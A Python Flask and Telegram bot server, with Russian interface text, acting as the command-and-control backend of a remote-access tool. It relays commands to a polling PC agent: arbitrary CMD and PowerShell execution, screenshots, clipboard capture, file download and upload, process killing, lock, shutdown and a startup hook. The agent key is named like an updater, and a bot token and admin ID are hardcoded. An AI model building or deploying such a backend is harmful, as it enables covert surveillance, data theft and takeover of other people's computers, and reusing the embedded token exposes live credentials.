import telebot
import os, time, datetime, json, threading
from flask import Flask, request, abort, jsonify, send_file
from werkzeug.utils import secure_filename

# ---- CONFIG ----
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8712749832:AAGnChNQus7mqp_2qQuMfK4-JNiorGGkkns")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7637946765"))
API_KEY = os.environ.get("API_KEY", "wupdater2026secret")
RENDER_URL = os.environ.get("RENDER_URL", "")
PORT = int(os.environ.get("PORT", "5000"))

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = Flask(__name__)

# ---- STATE ----
pending_commands = []    # [{id, cmd, time}]
pc_status = {"online": False, "last_seen": None, "info": ""}
cmd_counter = 0
UPLOAD_DIR = "/tmp/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ---- KEYBOARD ----
def main_kb():
    kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("📸 Скрин", "ℹ️ Инфо", "📋 Процессы")
    kb.row("📂 Файлы", "📋 Буфер", "🔒 Блокировка")
    kb.row("🟢 Статус ПК", "⚡ CMD", "💀 Выключить")
    return kb

# ---- FLASK: Health + API for C++ agent ----

@app.route('/')
def index():
    return "<h1>PC Remote Bot</h1><p>Status: Running</p>", 200

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    if request.content_type == 'application/json':
        upd = telebot.types.Update.de_json(request.get_data().decode('utf-8'))
        bot.process_new_updates([upd])
        return '', 200
    abort(403)

# Agent polls this for commands
@app.route('/api/poll', methods=['GET'])
def api_poll():
    if request.args.get('key') != API_KEY:
        abort(403)
    # Update PC status
    pc_status["online"] = True
    pc_status["last_seen"] = datetime.datetime.now().strftime("%H:%M:%S")
    info = request.args.get('info', '')
    if info:
        pc_status["info"] = info
    # Return pending commands
    cmds = list(pending_commands)
    pending_commands.clear()
    return jsonify({"commands": cmds})

# Agent sends text result
@app.route('/api/result', methods=['POST'])
def api_result():
    if request.form.get('key') != API_KEY and request.json and request.json.get('key') != API_KEY:
        abort(403)
    try:
        if request.content_type and 'json' in request.content_type:
            data = request.json
            bot.send_message(ADMIN_ID, data.get('text', '(empty)'))
        else:
            text = request.form.get('text', '')
            if text:
                # Truncate long messages
                if len(text) > 4000:
                    text = text[:4000] + "\n...(обрезано)"
                bot.send_message(ADMIN_ID, text)
    except Exception as e:
        print(f"Result error: {e}")
    return "ok"

# Agent sends photo
@app.route('/api/photo', methods=['POST'])
def api_photo():
    if request.form.get('key') != API_KEY:
        abort(403)
    try:
        f = request.files.get('photo')
        if f:
            path = os.path.join(UPLOAD_DIR, "screen.jpg")
            f.save(path)
            with open(path, 'rb') as p:
                bot.send_photo(ADMIN_ID, p)
            os.remove(path)
    except Exception as e:
        print(f"Photo error: {e}")
    return "ok"

# Agent sends file
@app.route('/api/file', methods=['POST'])
def api_file():
    if request.form.get('key') != API_KEY:
        abort(403)
    try:
        f = request.files.get('file')
        fname = request.form.get('filename', 'file')
        if f:
            path = os.path.join(UPLOAD_DIR, secure_filename(fname))
            f.save(path)
            with open(path, 'rb') as p:
                bot.send_document(ADMIN_ID, p, visible_file_name=fname)
            os.remove(path)
    except Exception as e:
        print(f"File error: {e}")
    return "ok"

# Admin uploads file for PC - agent downloads it
@app.route('/api/download', methods=['GET'])
def api_download():
    if request.args.get('key') != API_KEY:
        abort(403)
    # Check if there's a file waiting
    files = os.listdir(UPLOAD_DIR)
    for fn in files:
        if fn.startswith("for_pc_"):
            path = os.path.join(UPLOAD_DIR, fn)
            real_name = fn[7:]  # Remove "for_pc_" prefix
            return send_file(path, download_name=real_name, as_attachment=True)
    return jsonify({"file": None})

# ---- BOT COMMANDS ----

def queue_cmd(cmd):
    global cmd_counter
    cmd_counter += 1
    pending_commands.append({"id": cmd_counter, "cmd": cmd})

@bot.message_handler(commands=['start', 'help'])
def cmd_start(msg):
    if msg.chat.id != ADMIN_ID: return
    status = "🟢 Онлайн" if pc_status["online"] else "🔴 Оффлайн"
    bot.send_message(msg.chat.id,
        f"🤖 <b>Удалённое управление ПК</b>\n\n"
        f"Статус ПК: {status}\n\n"
        f"<b>Команды:</b>\n"
        f"/cmd &lt;команда&gt; — CMD\n"
        f"/ps &lt;команда&gt; — PowerShell\n"
        f"/screen — скриншот\n"
        f"/info — инфо о ПК\n"
        f"/procs — процессы\n"
        f"/kill &lt;PID&gt; — убить процесс\n"
        f"/ls [путь] — файлы\n"
        f"/cd &lt;путь&gt; — сменить папку\n"
        f"/dl &lt;путь&gt; — скачать файл\n"
        f"/clip — буфер обмена\n"
        f"/msg &lt;текст&gt; — сообщение\n"
        f"/lock — блокировка\n"
        f"/shutdown — выключить\n"
        f"/restart — перезагрузка\n"
        f"/search &lt;имя&gt; — поиск папки",
        parse_mode='HTML', reply_markup=main_kb())

@bot.message_handler(commands=['cmd'])
def cmd_cmd(msg):
    if msg.chat.id != ADMIN_ID: return
    c = msg.text[5:].strip()
    if not c: bot.send_message(msg.chat.id, "Укажи команду: /cmd dir"); return
    if not pc_status["online"]: bot.send_message(msg.chat.id, "🔴 ПК оффлайн"); return
    queue_cmd(f"cmd:{c}")
    bot.send_message(msg.chat.id, f"⏳ Выполняю: {c}")

@bot.message_handler(commands=['ps'])
def cmd_ps(msg):
    if msg.chat.id != ADMIN_ID: return
    c = msg.text[4:].strip()
    if not c: bot.send_message(msg.chat.id, "Укажи команду: /ps Get-Process"); return
    if not pc_status["online"]: bot.send_message(msg.chat.id, "🔴 ПК оффлайн"); return
    queue_cmd(f"ps:{c}")
    bot.send_message(msg.chat.id, f"⏳ PowerShell: {c}")

@bot.message_handler(commands=['screen'])
def cmd_screen(msg):
    if msg.chat.id != ADMIN_ID: return
    if not pc_status["online"]: bot.send_message(msg.chat.id, "🔴 ПК оффлайн"); return
    queue_cmd("screen")
    bot.send_message(msg.chat.id, "📸 Делаю скриншот...")

@bot.message_handler(commands=['info'])
def cmd_info(msg):
    if msg.chat.id != ADMIN_ID: return
    if not pc_status["online"]: bot.send_message(msg.chat.id, "🔴 ПК оффлайн"); return
    queue_cmd("info")

@bot.message_handler(commands=['procs'])
def cmd_procs(msg):
    if msg.chat.id != ADMIN_ID: return
    if not pc_status["online"]: bot.send_message(msg.chat.id, "🔴 ПК оффлайн"); return
    queue_cmd("procs")

@bot.message_handler(commands=['kill'])
def cmd_kill(msg):
    if msg.chat.id != ADMIN_ID: return
    pid = msg.text[6:].strip()
    if not pid: return
    queue_cmd(f"kill:{pid}")

@bot.message_handler(commands=['ls'])
def cmd_ls(msg):
    if msg.chat.id != ADMIN_ID: return
    path = msg.text[4:].strip() or ""
    queue_cmd(f"ls:{path}")

@bot.message_handler(commands=['cd'])
def cmd_cd(msg):
    if msg.chat.id != ADMIN_ID: return
    path = msg.text[4:].strip()
    if path: queue_cmd(f"cd:{path}")

@bot.message_handler(commands=['dl'])
def cmd_dl(msg):
    if msg.chat.id != ADMIN_ID: return
    path = msg.text[4:].strip()
    if not path: bot.send_message(msg.chat.id, "Укажи путь: /dl C:\\file.txt"); return
    queue_cmd(f"dl:{path}")
    bot.send_message(msg.chat.id, f"📥 Скачиваю: {path}")

@bot.message_handler(commands=['clip'])
def cmd_clip(msg):
    if msg.chat.id != ADMIN_ID: return
    queue_cmd("clip")

@bot.message_handler(commands=['msg'])
def cmd_msg(msg):
    if msg.chat.id != ADMIN_ID: return
    t = msg.text[5:].strip()
    if t: queue_cmd(f"msg:{t}")

@bot.message_handler(commands=['lock'])
def cmd_lock(msg):
    if msg.chat.id != ADMIN_ID: return
    queue_cmd("lock")
    bot.send_message(msg.chat.id, "🔒 Блокирую...")

@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(msg):
    if msg.chat.id != ADMIN_ID: return
    queue_cmd("shutdown")
    bot.send_message(msg.chat.id, "💀 Выключаю...")

@bot.message_handler(commands=['restart'])
def cmd_restart(msg):
    if msg.chat.id != ADMIN_ID: return
    queue_cmd("restart")
    bot.send_message(msg.chat.id, "🔄 Перезагружаю...")

@bot.message_handler(commands=['startup'])
def cmd_startup(msg):
    if msg.chat.id != ADMIN_ID: return
    queue_cmd("startup")

@bot.message_handler(commands=['search'])
def cmd_search(msg):
    if msg.chat.id != ADMIN_ID: return
    name = msg.text[8:].strip()
    if name:
        queue_cmd(f"search:{name}")
        bot.send_message(msg.chat.id, f"🔍 Ищу: {name}")

# ---- BUTTON HANDLERS ----

@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID, content_types=['text'])
def handle_buttons(msg):
    t = msg.text
    if "Скрин" in t: queue_cmd("screen"); bot.send_message(msg.chat.id, "📸 Скрин...")
    elif "Инфо" in t: queue_cmd("info")
    elif "Процессы" in t: queue_cmd("procs")
    elif "Файлы" in t: queue_cmd("ls:")
    elif "Буфер" in t: queue_cmd("clip")
    elif "Блокировка" in t: queue_cmd("lock"); bot.send_message(msg.chat.id, "🔒")
    elif "Статус" in t:
        s = "🟢 Онлайн" if pc_status["online"] else "🔴 Оффлайн"
        last = pc_status.get("last_seen", "—")
        bot.send_message(msg.chat.id, f"🖥 ПК: {s}\n⏰ Был: {last}")
    elif "CMD" in t: bot.send_message(msg.chat.id, "Отправь: /cmd <команда>")
    elif "Выключить" in t: queue_cmd("shutdown"); bot.send_message(msg.chat.id, "💀")
    elif not pc_status["online"]:
        bot.send_message(msg.chat.id, "🔴 ПК оффлайн. Агент не запущен.")

# File upload to PC
@bot.message_handler(content_types=['document'])
def handle_doc(msg):
    if msg.chat.id != ADMIN_ID: return
    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path)
        fname = "for_pc_" + (msg.document.file_name or "file")
        path = os.path.join(UPLOAD_DIR, fname)
        with open(path, 'wb') as f:
            f.write(data)
        queue_cmd(f"upload:{msg.document.file_name or 'file'}")
        bot.send_message(msg.chat.id, f"📤 Файл будет отправлен на ПК: {msg.document.file_name}")
    except Exception as e:
        bot.send_message(msg.chat.id, f"Ошибка: {e}")

# ---- PC TIMEOUT ----
def check_timeout():
    while True:
        time.sleep(15)
        if pc_status["online"] and pc_status["last_seen"]:
            try:
                last = datetime.datetime.strptime(pc_status["last_seen"], "%H:%M:%S")
                now = datetime.datetime.now()
                last = last.replace(year=now.year, month=now.month, day=now.day)
                if (now - last).total_seconds() > 20:
                    pc_status["online"] = False
            except: pass

threading.Thread(target=check_timeout, daemon=True).start()

# ---- STARTUP ----
def setup_webhook():
    url = f"{RENDER_URL}/{BOT_TOKEN}"
    try:
        bot.remove_webhook(); time.sleep(0.5)
        bot.set_webhook(url=url)
        print(f"Webhook: {url}")
    except Exception as e:
        print(f"Webhook error: {e}")

if RENDER_URL:
    setup_webhook()

if __name__ == "__main__":
    if RENDER_URL:
        app.run(host='0.0.0.0', port=PORT)
    else:
        bot.remove_webhook()
        print("Polling mode...")
        # Run Flask in background for agent API
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
        while True:
            try: bot.polling(non_stop=True, interval=1, timeout=60)
            except Exception as e: print(f"Error: {e}"); time.sleep(5)
